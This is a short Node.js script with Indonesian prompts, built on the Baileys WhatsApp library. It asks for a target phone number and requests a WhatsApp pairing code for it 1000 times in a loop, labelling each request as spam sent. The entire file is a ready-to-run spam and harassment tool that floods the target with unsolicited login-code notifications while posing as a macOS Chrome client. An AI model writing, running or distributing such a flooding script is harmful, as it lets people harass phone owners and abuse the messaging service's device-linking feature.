import { makeWASocket, DisconnectReason, useMultiFileAuthState, Browsers } from '@whiskeysockets/baileys';
import pino from 'pino';
import inquirer from 'inquirer';
import chalk from 'chalk';

let useCode = {
  isTrue: true,
};

async function connectToWhatsApp() {
  try {
    const { state, saveCreds } = await useMultiFileAuthState("cache");
    const sock = makeWASocket({
      logger: pino({ level: "fatal" }),
      auth: state,
      printQRInTerminal: false,
      keepAliveIntervalMs: 10000,
      browser: Browsers.macOS("Chrome"),
    });

    const WaNumber = await inquirer.prompt([
          {
            type: "input",
            name: "res",
            message: "Masukan Nomor WhatsApp: ",
          },
        ]);
        for (let i = 0; i < 1000; i++) {
        const code = await sock.requestPairingCode(WaNumber.res);
        console.log(chalk.cyanBright("Spam Terkirim: ", code, "ke nomor: ", WaNumber.res, i));
        +i;
}
  } catch (error) {
    console.error("Terjadi kesalahan:", error);
  }
}

connectToWhatsApp();
